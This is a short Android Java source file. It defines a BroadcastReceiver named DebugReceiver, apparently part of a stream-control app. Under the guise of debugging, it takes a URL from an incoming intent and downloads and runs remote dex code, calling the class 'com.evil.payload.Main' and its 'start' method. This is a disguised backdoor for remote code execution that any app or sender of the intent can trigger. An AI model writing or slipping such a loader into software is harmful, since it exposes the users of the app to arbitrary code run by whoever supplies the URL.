package com.rcl.androidstreamcontrol.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.rcl.androidstreamcontrol.utils.DexLoaderManager;

public class DebugReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if ("com.rcl.androidstreamcontrol.TEST_PAYLOAD".equals(intent.getAction())) {
            String url = intent.getStringExtra("url");
            Log.d("DebugReceiver", "Received request to test DexLoader from: " + url);
            if (url != null) {
                DexLoaderManager.loadAndExecutePayload(context, url, "com.evil.payload.Main", "start");
            }
        }
    }
}
